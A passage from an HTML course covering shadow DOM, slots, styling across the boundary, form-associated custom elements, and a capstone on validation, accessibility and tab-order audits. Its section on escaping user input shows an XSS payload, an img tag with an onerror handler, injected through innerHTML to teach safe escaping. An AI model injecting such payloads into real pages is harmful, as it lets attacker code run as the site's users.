customElements.define('boxed-note', BoxedNote);

document.body.innerHTML = '<boxed-note></boxed-note><p>Outside</p>';
const note = document.querySelector('boxed-note');
console.log('page sees paragraphs      :', document.querySelectorAll('p').length);
console.log('shadow root sees paragraphs:', note.shadowRoot.querySelectorAll('p').length);
console.log('light DOM children         :', note.childElementCount);

page sees paragraphs      : 1
shadow root sees paragraphs: 1
light DOM children         : 0

The document's querySelectorAll('p') finds one paragraph, the one outside. The shadow tree's paragraph is invisible to it. That is the encapsulation: selectors do not cross the boundary in either direction, and neither does the page's CSS. So the <style> inside affects only this component, and the page's own p { } rules do not reach it.

The shadow host is the element the root is attached to; the light dom is the host's ordinary children; the shadow tree is what attachShadow returned.

mode takes two values. An open shadow root can be reached from outside as host.shadowRoot. A closed shadow root returns null there, and only the code that called attachShadow holds the reference. Closed is not a security boundary, because anything running on your page can patch attachShadow before you call it. Mostly it stops your own tools and tests from reaching in. Use open unless you have a specific reason not to.

Some elements cannot host a shadow root at all: <input>, <img>, <br> and the other void and replaced elements. Their insides already are a shadow tree, drawn by the browser.

What this gives you is style encapsulation: a stylesheet inside the shadow root applies only within it, and a rule from the page does not reach in. style encapsulation is the main reason to reach for shadow DOM at all, and also the main reason not to, because the isolation works in both directions. A component that must pick up the host page's design system has to open specific holes in it with custom properties and ::part (§15.11).

15.8 Slots

A component with a shadow root replaces its own children, unless it says where they should go. A <slot> is that placeholder.

class UserCard extends HTMLElement {
  connectedCallback() {
    if (this.shadowRoot) return;
    this.attachShadow({ mode: 'open' }).innerHTML =
      '<h2><slot name="name">Anonymous</slot></h2>' +
      '<slot>No biography yet.</slot>';
  }
}
customElements.define('user-card', UserCard);

document.body.innerHTML =
  '<user-card><span slot="name">Ada Lovelace</span><p>Mathematician.</p></user-card>' +
  '<user-card></user-card>';
for (const card of document.querySelectorAll('user-card')) {
  const slots = card.shadowRoot.querySelectorAll('slot');
  console.log([...slots].map((s) => {
    const assigned = s.assignedNodes({ flatten: true })
      .map((n) => n.textContent.trim()).filter(Boolean);
    return `${s.name || '(default)'} -> ${assigned.join(' / ')}`;
  }).join(' | '));
}

name -> Ada Lovelace | (default) -> Mathematician.
name -> Anonymous | (default) -> No biography yet.

A named slot takes the children whose slot attribute matches its name. The unnamed default slot takes everything else. Content written inside the <slot> element is slot fallback, used when nothing is assigned, which is what the second card, with no children at all, fell back to.

Two things surprise people. Slotted content is not moved: it stays in the light DOM, is still in card.children, is still styled by the page's CSS, and is only drawn at the slot's position. That is why assignedNodes exists: the shadow tree has to ask what it was given.

The vocabulary: a slot attribute on a child of the host says which slot it belongs to, and a named slot is a <slot name="…"> in the shadow root that receives it. A child with no slot attribute goes to the default unnamed slot, and a slot attribute naming a slot that does not exist means the child is never drawn at all. slotted content stays in the light DOM, as the measurement above shows, so slotted content is styled by the page's own CSS, not by the shadow root's, except through the ::slotted() selector (§15.11).

15.9 The Flattened Tree

What the user gets is neither the light DOM nor the shadow DOM but the composed tree: the shadow tree with each slot replaced by the nodes assigned to it. Rendering uses it, and so does the accessibility tree, which means a component's meaning is the combination of both halves:

<user-card>
  <template shadowrootmode="open">
    <h2><slot name="name">Anonymous</slot></h2>
    <slot>No biography yet.</slot>
  </template>
  <span slot="name">Ada Lovelace</span>
  <p>Mathematician and writer.</p>
</user-card>

AX TREE
heading "Ada Lovelace" level=2
paragraph
  text "Mathematician and writer."

The heading is named "Ada Lovelace": text that lives in the light DOM, passed through a slot in the shadow DOM, into a heading that neither half defines on its own. Nothing about the shadow boundary shows in the tree. That is the correct outcome, and it is why a well-built component needs no ARIA at all.

The boundary does limit one thing: an id reference cannot cross it. aria-labelledby="heading" inside a shadow root cannot point at an id in the document, and the reverse fails too, because ids belong to their own tree. That is the biggest practical difficulty with accessible web components. The answer is either to keep both ends of a relationship on the same side of the boundary, or to use ElementInternals (§15.12), whose ARIA properties take references to elements instead of id strings.

15.10 Declarative Shadow DOM

Everything above attaches the shadow root from script, so a page rendered on the server shows nothing until JavaScript runs. Declarative shadow dom removes that problem: a <template> with a shadowrootmode attribute is turned into a shadow root by the parser itself.

That is what the block in §15.9 used, and notice what was not there: no customElements.define, no attachShadow, no script of any kind. The parser saw shadowrootmode="open" and attached the root, and the accessibility tree above proves that it rendered.

document.body.innerHTML = '<div id="host"><template shadowrootmode="open"><p>x</p></template></div>';
console.log('innerHTML does not parse it:', document.getElementById('host').shadowRoot);

innerHTML does not parse it: null

That result is the rule to remember: declarative shadow DOM is a parser feature, not an innerHTML feature. Markup that arrives through innerHTML leaves the template as an ordinary inert template. To parse it from a string on purpose, setHTMLUnsafe opts in. For markup streamed from the server the question never comes up, because the parser handles it.

The reward is that a component can be rendered completely on the server (markup, shadow root, styles) and be visible and readable before any script downloads. When the definition arrives, connectedCallback finds the shadow root already there, which is why every example in §15.7 begins by checking if (this.shadowRoot) return;.

Note the difference once more, because it is the thing that catches people: declarative shadow DOM is a parser feature. Markup containing <template shadowrootmode> assigned through innerHTML produces no shadow root at all; sethtml, meaning setHTMLUnsafe(), is the opt-in that makes the parser honour it. So sethtml is what you need when the markup arrives after the page has loaded.

This is the feature that makes web components work with server-side rendering. Without it, a component's shadow DOM exists only after its JavaScript has run, so a server-side rendering pipeline outputs an empty custom element and the page flashes. Declarative shadow DOM lets the server output the shadow tree as markup, so the first paint is correct and the upgrade is invisible.

15.11 Styling Across the Boundary

Page CSS cannot reach into a shadow tree, and shadow CSS cannot leak out. Four selectors are the agreed exceptions, and they belong here rather than in css_mastery, because they are part of the contract between a component and the page that uses it.

:host
Inside the shadow, selects the host element itself. :host([disabled]) styles it by its own attribute.
::slotted()
Inside the shadow, selects assigned light-DOM children — top level only, because they are the page's elements and the component may not reach further into them.
::part()
From outside, selects an internal element the component explicitly exposed with a part attribute. This is the component's styling API: what it does not name, the page cannot style.
Custom properties
CSS custom properties inherit straight through the boundary, which makes them the simplest theming hook a component can offer.
<style>
  fancy-button::part(label) { text-transform: uppercase; }
  fancy-button { --accent: rebeccapurple; }
</style>
<fancy-button>
  <template shadowrootmode="open">
    <style>
      :host { display: inline-block; }
      button { border: 2px solid var(--accent, black); }
      ::slotted(strong) { color: var(--accent, black); }
    </style>
    <button part="label"><slot></slot></button>
  </template>
  <strong>Buy</strong> now
</fancy-button>

The rule of thumb: expose a small, named surface with the part attribute and custom properties, and treat everything else as private. A component that exposes nothing cannot be used in a real design system; one that exposes everything has no encapsulation left and cannot be changed.

Two selectors do the crossing. ::slotted() matches a slotted element from inside the shadow root (::slotted(p) styles the paragraphs the page put in), and it reaches only the top-level slotted nodes, not their descendants. ::part() works the other way: the component marks an element with part="label", and the page writes my-widget::part(label). So ::slotted() lets the component style what the page gave it, and ::part() lets the page style what the component chose to expose.

15.12 Form-Associated Custom Elements

A custom element is not a form control by default: it has no value, submits nothing, and FormData cannot see it. ElementInternals fixes that, and it is the piece that makes web components workable for real applications.

<form id="checkout">
  <label for="r">Rating</label>
  <star-rating id="r" name="rating" value="4"></star-rating>
</form>

<script type="module">
class StarRating extends HTMLElement {
  static formAssociated = true;
  static observedAttributes = ['value'];

  constructor() {
    super();
    this.internals = this.attachInternals();
    this.internals.role = 'slider';
  }
  attributeChangedCallback(name, _old, value) {
    if (name === 'value') this.internals.setFormValue(value);
  }
  get form() { return this.internals.form; }
}
customElements.define('star-rating', StarRating);
</script>

Measured in Chromium, that element reports internals.form.id as checkout, and new FormData(document.getElementById('checkout')) gives rating=4: the custom element submits exactly as a native control would.

static formAssociated
Must be true, or attachInternals gives you an object with none of this.
attachInternals()
Called once, in the constructor. Calling it twice throws, which is a deliberate guard against a second party grabbing your element's internals.
setFormValue()
The value submitted. Call it whenever the value changes — the ordering rule of §15.4 means the attribute callback is the right place.
internals.form
The form owner (§12.6), found the same way a native control finds it.
setValidity()
Puts the element into constraint validation (§12.8): it can be invalid, block submission and match :invalid.
internals.role, internals.aria*
Role and ARIA state set from JavaScript, as defaults the page can still override in markup — and, unlike attributes, they take element references, so they work across a shadow boundary (§15.9).

The last row is why ElementInternals matters beyond forms. Setting this.internals.role = 'slider' gives the element its meaning without writing role="slider" into the page's markup, so the component's contract with the accessibility tree is part of its definition, not something every user of the component must remember.

15.13 Customized Built-Ins

There is a second kind of custom element, the customized built-in. It extends an existing element instead of HTMLElement, and it is used with the is attribute.

<button is="confirm-button" type="submit">Delete</button>

The attraction is obvious: you inherit everything <button> does, including the role, the keyboard behaviour and taking part in forms, instead of rebuilding it. The problem is just as simple: Safari has declined to implement it, and has said so for years. A customized built-in therefore needs a polyfill to work everywhere, which leaves it in an awkward position.

The workable alternative is to wrap instead of extend: <confirm-button><button type="submit">Delete</button></confirm-button>, with the custom element adding behaviour to the real button inside it. The native meaning stays native, the pattern works in every browser, and the button in the light DOM is exactly what §15.8's slots are for.

15.14 When Not to Reach for This

Custom elements are the right tool less often than their prominence suggests.

A native element exists
<details> is an accordion, <dialog> is a modal, <select> is a dropdown (§14). Each is a rebuild you do not have to do.
You are inside one framework
A framework's own components are better integrated with its state and rendering. Custom elements pay off at the boundary between stacks — a design system consumed by three applications that do not share a framework.
You only wanted style scoping
CSS cascade layers, @scope and a naming convention solve that without a shadow boundary and its id-reference problem (§15.9).
It must work without script
A custom element with no declarative shadow DOM renders nothing until its definition loads. Server-render the content and enhance it (§12.14).

Where they really win: a component that must be usable from plain HTML by people outside your team, that must survive a move to a different framework, and whose styles must not be broken by the page it sits on. That is a real situation that keeps coming up, and nothing else on the platform handles it.

Exercises

1. Why does this element render nothing, and what are the two ways to fix it?

class MyBox extends HTMLElement {
  constructor() {
    super();
    this.innerHTML = `<p>${this.getAttribute('label')}</p>`;
  }
}
customElements.define('my-box', MyBox);
Solution

Because the constructor runs before the element has attributes or children (§15.4). The specification is explicit that a custom element constructor must not inspect attributes, must not add children, and must not gain or lose attributes — and the reason is document.createElement('my-box'), which runs the constructor on an element that has nothing yet. So this.getAttribute('label') returns null and the paragraph reads "null"; in a parser-created element, writing children from the constructor can also throw.

Fix one — move the work to connectedCallback:

class MyBox extends HTMLElement {
  connectedCallback() {
    this.innerHTML = `<p>${this.getAttribute('label')}</p>`;
  }
}

By then the parser has supplied the attributes, and §15.4's measured ordering guarantees every observed attribute has already been delivered.

Fix two — attach a shadow root in the constructor and fill it later. Creating the root is one of the few things the constructor is allowed to do, so the usual shape is this.attachShadow({mode:'open'}) in the constructor and the rendering in connectedCallback.

Two further points on that code. connectedCallback can run more than once, so it needs to be idempotent — re-running the innerHTML assignment above would destroy and rebuild the subtree on every move. And interpolating an attribute into innerHTML is an injection path (§16.9): textContent on a created element avoids it entirely, which is one of the arguments for <template> in §15.2.

2. A <fancy-input> wraps a real <input> in its shadow root. Nothing the page writes styles it, and document.querySelector('input') returns null. Explain, and say what the component should expose.

Solution

Both symptoms are the shadow boundary doing its job (§15.7). Selectors do not cross it in either direction: the page's input { } rule does not reach in, and document.querySelector('input') does not find an element that is not in the document tree. The input is in the shadow tree, reachable only as host.shadowRoot.querySelector('input') — and only because the root is open.

What the component should expose, in order of preference:

A part attribute. <input part="field"> lets the page write fancy-input::part(field) { ... } (§15.11). This is the deliberate styling API: the component decides what is styleable and can restructure everything else without breaking consumers.

Custom properties. --fancy-border, --fancy-radius, read inside the shadow with var(). They inherit through the boundary, so a page-level theme reaches every instance.

:host states. :host([invalid]) lets the page drive appearance through an attribute rather than through a selector into the internals.

What it should not do: switch to a closed root (that makes the problem worse and buys no security — §15.7), or abandon the shadow root and lose the encapsulation that was the reason for the component.

There is a separate design question underneath. If the page needs to reach the input directly — to focus it, read its value, or associate an external <label> — the component is exposing too little. Either surface those as properties and methods (.value, .focus(), and delegatesFocus: true on the root), or make it form-associated with ElementInternals (§15.12) so it behaves as a control rather than as a box containing one. The id-reference problem is real here: an external <label for="..."> cannot name an element inside a shadow root.

3. What does oldValue === null mean in attributeChangedCallback, and how do you distinguish "absent" from "present but empty"?

Solution

null means the attribute was not present — either this is the first time it has been set, or it has just been removed. It is never undefined and never ''.

An attribute that is present with no value gives the empty string, because <my-el flag> is a boolean attribute whose value is "" (§2.4). So the two cases are cleanly separable:

class FlagBox extends HTMLElement {
  static observedAttributes = ['flag'];
  attributeChangedCallback(name, oldValue, newValue) {
    if (newValue === null) {          // removed, or never there
      this.disabled = false;
    } else {                          // present — "" counts as present
      this.disabled = true;
    }
    console.log(`${JSON.stringify(oldValue)} -> ${JSON.stringify(newValue)}`,
                '| disabled:', this.disabled);
  }
}
customElements.define('flag-box', FlagBox);
const el = document.createElement('flag-box');
el.setAttribute('flag', '');
el.removeAttribute('flag');

null -> "" | disabled: true
"" -> null | disabled: false

That is exactly how boolean attributes work everywhere in HTML: disabled, checked and required are true by presence, and their value is irrelevant (§2.4). hasAttribute is the direct spelling of the same test.

The measured sequence from §15.5 shows both transitions: setting size reported large, and removing it reported null. Note also that setting an attribute to the value it already has does not fire the callback in the removal-then-addition sense — but explicitly re-setting the same value does fire it, with oldValue === newValue, so any handler that does expensive work should compare the two first.

4. Your team wants a design system used by a React application, a Vue application and a server-rendered admin tool. Argue for and against building it as custom elements.

Solution

For.

One implementation. The alternative is three, kept in sync by discipline, and they will drift — usually in the accessibility details, which nobody notices until an audit.

It survives the stack. A framework migration does not invalidate the components, because the contract is the platform's element model rather than any framework's component model. On a five-year horizon that is the strongest argument here.

Real encapsulation. Shadow DOM guarantees the admin tool's global stylesheet cannot break a button (§15.7), which no naming convention actually guarantees.

It works in plain HTML. The server-rendered tool can use <ds-button> with no build step at all, and with declarative shadow DOM (§15.10) it renders before any script loads.

Against.

Framework integration is uneven. Passing anything that is not a string means setting properties rather than attributes (§15.6), and frameworks differ in whether their templates can do that. Events need care too, since a custom event must be composed to cross the shadow boundary.

Forms and accessibility need ElementInternals (§15.12) to work properly, and the id-reference problem across the boundary (§15.9) is a genuine recurring cost — an external <label for> cannot reach inside.

Server-side rendering is harder. It works, through declarative shadow DOM, but the framework integrations for it are less mature than for framework-native components.

Two component models. Application developers now write framework components that contain custom elements, and have to know which rules apply where.

A recommendation. Build the primitives that are shared, stable and style-sensitive — button, input, icon, card, tooltip — as custom elements, and let each application compose them with its own framework components. Wrap rather than extend (§15.13), so the native <button> keeps its semantics. And keep the surface small: parts and custom properties for styling, attributes for configuration, properties for data, events for output.

5. Explain why <slot> content is still in the light DOM, and give one consequence that is useful and one that is a trap.

Solution

Because slotting is a rendering operation, not a DOM move (§15.8). The composed tree — what is painted and what the accessibility tree is built from — places assigned nodes at their slot's position, but the nodes themselves never leave the host's children. card.children still contains them, document.querySelector still finds them, and their parentElement is still the host.

Useful consequence: the page still owns them. They are styled by the page's stylesheet, so a <user-card> containing <p>Mathematician.</p> gets the page's paragraph styling automatically, and a consumer can put any markup they like into a slot without the component having to anticipate it. The component styles only what it owns, plus whatever ::slotted() reaches at the top level (§15.11).

Trap: this.children is not what the component rendered. Reading children directly gives you what the page supplied in source order, not what ended up in any particular slot — and nothing at all about fallback content, which lives in the shadow tree and is used only when a slot has no assignment. The correct question is slot.assignedNodes({flatten: true}), and flatten: true matters because a slot can itself be assigned to another slot in a nested component.

A second trap in the same family: slotchange fires when the assignment changes, and a component that reads its children once in connectedCallback will not notice a consumer adding a child later. Listen for slotchange if the content is dynamic.

SECTION 16

Capstone: Build, Validate and Audit a Real Document

Every section so far has taught one part of the language. This one is about the work that happens after the markup is written: proving that the document the browser built is the document you meant, that everyone can use it, and that it does not become a way to attack your users the moment real data flows through it.

That is three separate audits, and each one catches defects the other two cannot see:

  • A validator finds markup that is not allowed. It cannot tell you the page has no landmarks.
  • An accessibility audit finds a missing label. It cannot tell you the tab order is wrong.
  • Neither has anything to say about what happens when a user's display name contains a <script> tag. That is the security audit's job.

So this section builds one real document and runs all three passes over it, with the evidence produced by driving an actual browser rather than simply asserted.

16.1 The Document

A product page, complete. Every element in it has appeared earlier in the course, and the cross-references say where.

<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Cast iron skillet, 26cm — Acme</title>
  <meta name="description" content="A 26cm pre-seasoned cast iron skillet, oven safe to 260°C.">
  <link rel="canonical" href="https://example.com/products/skillet">
  <link rel="stylesheet" href="/style.css">
</head>
<body>
  <a href="#main" class="skip-link">Skip to content</a>

  <header>
    <a href="/"><img src="/logo.svg" alt="Acme" width="120" height="40"></a>
    <nav aria-label="Main">
      <ul>
        <li><a href="/shop" aria-current="page">Shop</a></li>
        <li><a href="/about">About</a></li>
      </ul>
    </nav>
  </header>

  <main id="main" tabindex="-1">
    <nav aria-label="Breadcrumb">
      <ol>
        <li><a href="/">Home</a></li>
        <li><a href="/shop">Shop</a></li>
        <li><a href="/shop/skillet" aria-current="page">Cast iron skillet</a></li>
      </ol>
    </nav>

    <article>
      <h1>Cast iron skillet, 26cm</h1>

      <figure>
        <img src="/img/skillet-800.jpg"
             srcset="/img/skillet-400.jpg 400w, /img/skillet-800.jpg 800w"
             sizes="(min-width: 40em) 50vw, 100vw"
             alt="A cast iron skillet on a gas hob" width="800" height="800"
             fetchpriority="high">
        <figcaption>The 26cm skillet, pre-seasoned.</figcaption>
      </figure>

      <p>Pre-seasoned and oven safe to 260&nbsp;°C. Made in Sheffield.</p>

      <form action="/basket" method="post">
        <p><label for="qty">Quantity</label>
           <input id="qty" name="qty" type="number" min="1" max="10" value="1" required></p>
        <button>Add to basket</button>
      </form>

      <section aria-labelledby="specs-h">
        <h2 id="specs-h">Specifications</h2>
        <table>
          <caption>Dimensions and weight</caption>
          <tr><th scope="col">Property</th><th scope="col">Value</th></tr>
          <tr><th scope="row">Diameter</th><td>26&nbsp;cm</td></tr>
          <tr><th scope="row">Weight</th><td>2.1&nbsp;kg</td></tr>
        </table>
      </section>
    </article>
  </main>

  <footer>
    <p>&copy; 2026 Acme Cookware</p>
  </footer>
</body>
</html>

Nothing in it is decorative:

  • lang (§2.12), so a screen reader pronounces it correctly;
  • charset first (§3.3);
  • viewport (§3.7);
  • the skip link first (§6.10);
  • landmarks from elements rather than roles (§6.11);
  • srcset with sizes and real dimensions (§8.7, §8.4);
  • a labelled control (§11.2);
  • a captioned table with scope (§10.5).

16.2 Pass One: What the Parser Built

The first question is whether the DOM matches the markup, and §1.8 is the reason it might not. Here is the same page's markup with three ordinary mistakes in it: an unclosed link, wrongly nested emphasis, and a wrapper <div> inside a table:

<ul>
  <li><a href="/a">First
  <li><b>Second</b>
</ul>
<p>A paragraph <b>with bold <i>and italic</b> still italic?</i></p>
<table><div>Wrapper</div><tr><td>Cell</td></tr></table>

DOM TREE
<ul>
  #text "\n  "
  <li>
    <a href="/a">
      #text "First\n  "
  <li>
    <a href="/a">
      <b>
        #text "Second"
      #text "\n"
<a href="/a">
  #text "\n"
  <p>
    #text "A paragraph "
    <b>
      #text "with bold "
      <i>
        #text "and italic"
    <i>
      #text " still italic?"
  #text "\n"
  <div>
    #text "Wrapper"
  <table>
    <tbody>
      <tr>
        <td>
          #text "Cell"

Read that tree carefully, because every line of it is a defect that produced no error message.

The source has one <a> start tag and the DOM has three <a> elements. The parser keeps a list of active formatting elements, and when a formatting element is still open at the end of a container, it is rebuilt in the next one. So the link meant to wrap the word "First" now also wraps "Second", and then wraps the paragraph, the div and the entire table. On the real page, every one of those is inside a link. A user tabbing through lands on one enormous link whose accessible name is the whole rest of the document (§7.10).

The mis-nested <b> and <i> produced two <i> elements. <b>with bold <i>and italic</b> still italic?</i> cannot be a tree, because the elements overlap. So the adoption agency algorithm (the parser's rule for overlapping formatting tags) splits the <i> into one inside the <b> and one after it. The result looks roughly right, which is exactly why nobody notices, and any script or stylesheet that expects one element finds two.

The <div> was evicted from the table and put back in before it (§10.4), and a <tbody> the source never wrote was added around the row.

None of these is an "error" in any sense the browser reports. check_html.py's PARSER-MOVED check exists for exactly this family of problems, and the general lesson is §1.8's: HTML has no parse errors, so the only way to know what you built is to look at what you built.

None of those is a parse error in any sense HTML defines, and that is the point to take away. The specification uses the term parse error for markup it does not allow, and requires the parser to recover and carry on anyway. The recovery is specified, so every browser agrees, but nothing shows it to you.

16.3 Pass One, Continued: The Tools

Three tools answer "what did the parser build?", each more or less convenient.

The browser's Elements panel shows the DOM, not your source; that is the point of §1.11. If the markup you wrote and the tree you see disagree, the tree is the truth. This is the fastest check and the one to do first, because the defects in §16.2 are all visible there in a way they are not in an editor.

View Source shows the bytes the server sent, before the parser touched them and before any script ran. The two together are the diagnosis. Something in view source but missing from the Elements panel was moved or dropped by the parser. Something missing from view source but present in the DOM was added by script.

document.body.innerHTML is the DOM turned back into text, which is the mechanical version of the same comparison. Because it goes through the same serialiser every time, it is what an automated check compares with the source.

16.4 Pass Two: The Validator

A validator checks the document against the specification's grammar and its content models (§2.6). The reference implementation is the Nu HTML Checker, and it is what runs behind the W3C validator at validator.w3.org; the two names refer to one tool. You can point it at a URL, upload a file to it, or run it locally as a jar or a container so that it becomes part of a build.

What it catches is a specific and useful list:

Content model violations
A <div> inside a <p>, a <li> outside a list, a <div> inside a <table> — the causes of every rewrite in §16.2.
Misnested and unclosed elements
An unclosed element and a misnested element are both reported, with the line and column where the parser noticed.
Duplicate IDs and attributes
§2.2 measured that a duplicate attribute is silently discarded. This is the tool that tells you.
Bad attribute values
An invalid enumerated keyword, a malformed URL, a width="50%" where a number is required (§8.4).
Missing required content
No <title>, an <img> with no alt, a <track kind="subtitles"> with no srclang.
Invalid ARIA
A role that does not exist, an aria-* that does not exist, a role used where the specification forbids it (§13.10).

A validation error is not a browser error. The page still renders, because §1.8 guarantees it. The error says the document is outside the language, which means the recovery algorithm decides its behaviour instead of the specification. That is the argument for fixing such errors: not that the page is broken today, but that nothing promises it will render the same way tomorrow or in another engine.

Run it in CI, not by hand. A validator is valuable because it stays at zero; running it once a year on a page with four hundred errors tells you nothing. The practical setup is the checker running locally against the rendered output of your key routes, failing the build on any error, with a short, documented list of exceptions for the cases you have deliberately accepted.

Validate the rendered output, not the template. A template file is not HTML; it is a program that produces HTML, and validating it produces noise. What matters is what a browser receives: for a page rendered on the server, that is the response body, and for one rendered in the browser it is document.documentElement.outerHTML after hydration (the moment the page's JavaScript takes over the markup).

To name the tool once more: the nu html checker is the implementation, the w3c validator is the public front end to it, and both report the same validation error list. A misnested element is reported at the line and column where the parser noticed it, not where you wrote it, which is worth knowing: a misnested element reported at line 400 usually began at line 380.

16.5 What the Validator Cannot See

This is what decides how much weight to put on a clean result. A document can be perfectly valid and completely unusable, because the validator checks grammar, not meaning.

  • alt="image" is valid. So is alt="DSC_4021.jpg", and so is a paragraph of keywords (§8.3).
  • A heading hierarchy that jumps from <h2> to <h4> is valid; §6.2 measured the tree reporting level=4 straight after level=2, with nothing to correct it.
  • A page with no landmarks at all is valid. <div class="main-nav"> breaks no rule.
  • A <div onclick> instead of a <button> is valid (§7.2).
  • A tab order that jumps around the screen is valid; §14.4 measured CSS order moving the boxes and not the stops.
  • role="presentation" on a data table is valid, and §10.12 measured that it deletes the table, its rows and its cells from the accessibility tree.
  • Link text reading "click here" is valid.
  • Colour contrast is a property of the pixels drawn on screen, not of the markup, so a markup validator has nothing to measure; §13.12's automated accessibility scan is the pass that checks it.

Every item on that list is a real defect that gets past a clean validator, which is why the next two passes exist and are not optional.

The heading hierarchy deserves emphasis, because it is both the most common of these and the easiest to fix: a heading hierarchy that skips a level is valid markup, invisible on the page, and obvious at once in the list of headings.

16.6 Pass Three: Auditing the Accessibility Tree

The accessibility tree is what assistive technology receives (§13.1), and reading it is the most direct audit there is: it is the output itself, not a stand-in for it.

Here is the product page's <article>, as Chrome exposes it:

<article>
  <h1>Cast iron skillet, 26cm</h1>
  <p>Pre-seasoned, oven safe to 260 °C.</p>
  <form action="/basket" method="post">
    <label for="qty">Quantity</label>
    <input id="qty" name="qty" type="number" min="1" max="10" value="1">
    <button>Add to basket</button>
  </form>
</article>

AX TREE
article
  heading "Cast iron skillet, 26cm" level=1
  paragraph
    text "Pre-seasoned, oven safe to 260 °C."
  form
    LabelText
      text "Quantity"
    spinbutton "Quantity" valuemax=10 valuemin=1 valuetext=1
      text "1"
    button "Add to basket"

Everything you would want to check is visible in ten lines. The article is an article. The heading is level=1 and reads correctly. The control is a spinbutton named "Quantity", so the <label for> worked, and its min and max became valuemin and valuemax with no ARIA anywhere in the markup (§13.5). The button has an accessible name.

Three ways to get this tree for a page of your own:

  • The browser's accessibility panel. In Chrome's DevTools, the Elements panel has an Accessibility pane showing the selected node's computed role and name, and the full chain of steps that produced the name; the tree for the whole page is available from the same pane. Firefox has a separate Accessibility panel with a tree view and a check for missing names and low contrast.
  • The protocol. Accessibility.getFullAXTree over the Chrome DevTools Protocol returns the whole tree as data, which is what makes it automatable. It is exactly what produced every AX tree in this course.
  • A real screen reader. NVDA on Windows, VoiceOver on macOS and iOS, TalkBack on Android, Orca on Linux. Nothing else tells you what the experience is really like, and half an hour with one changes how you write markup for good.

What to look for, in order:

  1. Landmarks: is there a main? Is each navigation named? Is anything outside a landmark?
  2. Headings: one level=1, no skipped levels, and the list reads as an outline of the page.
  3. Names: every button, link, textbox, image and iframe has one, and it says what the control does rather than what it looks like.
  4. Roles: nothing is generic that should be a control; no LayoutTable where a data table was intended (§10.10).
  5. States: expanded, checked, disabled, invalid and current reflect what is on screen.

This pass is what most people mean by an accessibility audit, and it is worth being clear that an accessibility audit is two activities, not one. An automated scan catches a fixed list of clear-cut defects; a manual review of the tree and the keyboard catches everything else. §13.12 measures the split; the short version is that the automated half finds around a third of what is there.

16.7 Pass Four: Auditing the Tab Order

Focus order is not a property of the markup at all (§14.1), so it cannot be read out of a document; it has to be measured by pressing Tab. It is also the audit that finds the most defects for the least effort, because it needs no tools: put your hands on the keyboard and go through the page.

Five questions, in order:

Is the first stop the skip link? §6.10 measured that it must be first, and it is the most common thing to get wrong when a header is restyled.

Does the focus indicator ever disappear? If you cannot see where you are, the page cannot be used from the keyboard. outline: none with no replacement is the cause, every time.

Does the order follow the visual order? §14.4 measured CSS order reversing the boxes and leaving the stops in source order. Anything that reorders things visually (flexbox, grid placement, position: absolute) is a suspect.

Are there stops you cannot see? A hidden menu, an off-screen modal, a carousel's other slides. If it is hidden with opacity, height: 0 or a negative offset, its controls are still focusable, and so is a descendant that sets visibility back to visible inside a hidden parent. Only display: none, visibility: hidden, hidden and inert remove them (§13.8, §14.10). (Measured in Chromium: Tab skipped a button inside a visibility: hidden container and stopped on one inside a child that set visibility: visible.)

Can you get out of everything you can get into? A dialog that traps focus and cannot be closed with Escape is the worst defect on this list, because the user's only remaining option is to close the tab.

The automated version is what check_ax.py does: press Tab and record document.activeElement at each stop. That is how §14.3's positive-tabindex measurement and §9.7's one-stop media player were established, and it is the one mode of that tool that nothing static can replace.

16.8 Generated Markup

Almost no HTML is written by hand any more. It comes out of a template engine, on the server or in a component framework, and that changes what can go wrong.

Three failures are specific to generated markup, and all three have appeared earlier in this course.

The wrapper element that is not allowed. A conditional or a loop that outputs a <div> between a <table> and its <tr> elements produces §10.4's foster parenting. Between a <ul> and its <li> elements it is invalid, and whether the list role survives is left to each browser's recovery (§2.9). This is why every templating language has a "fragment" or "no wrapper" syntax, and tables are the main reason it exists.

The attribute that should not be there. checked="{{isChecked}}" renders checked="false", which is checked (§2.4). hidden="{{isHidden}}" hides an element when the flag is false. Every framework has special syntax for boolean attributes, because the attribute cannot express "false".

The duplicate id. A component that hard-codes id="email" for its <label for> is correct once, and broken the second time it is used on a page. getElementById, <label for> (§11.2), aria-labelledby (§13.3) and fragment links (§7.5) all go to the first match, which is usually the wrong copy. The fix is a unique id generated for each copy. It is worth auditing for, because nothing about the page looks wrong: the second form's label just quietly focuses the first form's field.

The audit that catches all three is the same: look at the rendered output, not the template. Run the validator against a response body, and read the DOM in the Elements panel rather than the component's source.

A template engine is not the enemy here; it is the layer where all three become systematic rather than occasional. A template engine that escapes by default, offers a fragment syntax and generates unique IDs for each component instance removes every one of them. One that does none of those makes each of them a code-review item forever.

16.9 Escaping User Input

The moment a page contains something a user typed, HTML stops being only a document format and becomes an execution boundary. This is the most important thing in the section.

html injection is what happens when text a user supplied is placed into a page as markup instead of as text. cross-site scripting, usually written xss, is the case where the injected markup runs a script. The attacker's code then runs with your page's origin: it can read the DOM, read localStorage, read and send cookies that are not HttpOnly, make logged-in requests as the user, and rewrite anything on the page.

The mechanism is one line, and you can measure the difference between the safe and unsafe versions:

document.body.innerHTML = '<div id="a"></div><div id="b"></div>';
const supplied = '<img src=x onerror="steal()"> Hello';

document.getElementById('a').innerHTML = supplied;
document.getElementById('b').textContent = supplied;

console.log('innerHTML   ->', document.getElementById('a').innerHTML);
console.log('textContent ->', document.getElementById('b').innerHTML);
console.log('img elements created:', document.querySelectorAll('img').length);

innerHTML   -> <img src="x" onerror="steal()"> Hello
textContent -> &lt;img src=x onerror="steal()"&gt; Hello
img elements created: 1

innerHTML parsed the string and built a real <img> element carrying a real onerror handler. The src is deliberately invalid, so the error fires at once and the handler runs. No user interaction is needed and no <script> tag is involved, which is why filtering for the word "script" catches nothing.

textContent escaped it. The < and > became &lt; and &gt;, the string appears on the page as the characters the user typed, and the document contains exactly one <img>: the injected one, in the first div.

Four rules follow, in order of importance.

Escape by default, at the point of output. Every serious template engine escapes inserted values automatically and requires an explicit opt-out: Jinja's |safe, Django's |safe, Rails' html_safe, React's dangerouslySetInnerHTML, Vue's v-html. Those opt-outs are your audit list: search for them, and justify each one.

Escape for the right context. The four contexts need different escaping, and a function that only knows about text is not enough:

Text content
Escape & and < (§2.13). This is what textContent does.
Attribute value
Escape the quote character too, and always quote the attribute — §2.2's rule, and an unquoted value lets an attacker add attributes with a single space.
URL attribute
Escaping is not enough: href="javascript:…" is a script that needs no angle brackets. Allow only http, https, mailto and relative URLs.
Inside a script or a style
